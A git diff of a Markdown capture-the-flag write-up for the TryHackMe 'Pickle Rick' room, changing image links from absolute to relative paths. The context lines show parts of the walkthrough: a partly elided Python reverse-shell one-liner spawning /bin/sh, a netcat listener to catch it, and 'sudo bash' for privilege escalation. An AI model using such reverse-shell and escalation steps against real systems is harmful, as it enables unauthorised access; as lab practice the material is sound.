@@ -2,7 +2,7 @@
 title: Pickle Rick
 permalink: pickleRick
 ---
-# ![front](saharshtapi.github.io/images/pickleRick/front.png)
+# ![front](/images/pickleRick/front.png)
 [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)
 
 ## Open Ports:
@@ -21,9 +21,9 @@ permalink: pickleRick
     >python -c 'import ......os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  - listening via netcat will gain you access to the **BOX**
 ### 1st Flag:
-![user_flag](saharshtapi.github.io/images/pickleRick/1st.png)
+![user_flag](/images/pickleRick/1st.png)
 ### 2nd Flag:
-![user_flag](saharshtapi.github.io/images/pickleRick/2nd.png) 
+![user_flag](/images/pickleRick/2nd.png) 
 
 
 ## Privilege Escalation:
@@ -32,4 +32,4 @@ permalink: pickleRick
       > 'sudo bash'
     
 ### 3rd Flag:
-![rootflag.png](saharshtapi.github.io/images/pickleRick/3rd.png)
+![rootflag.png](/images/pickleRick/3rd.png)
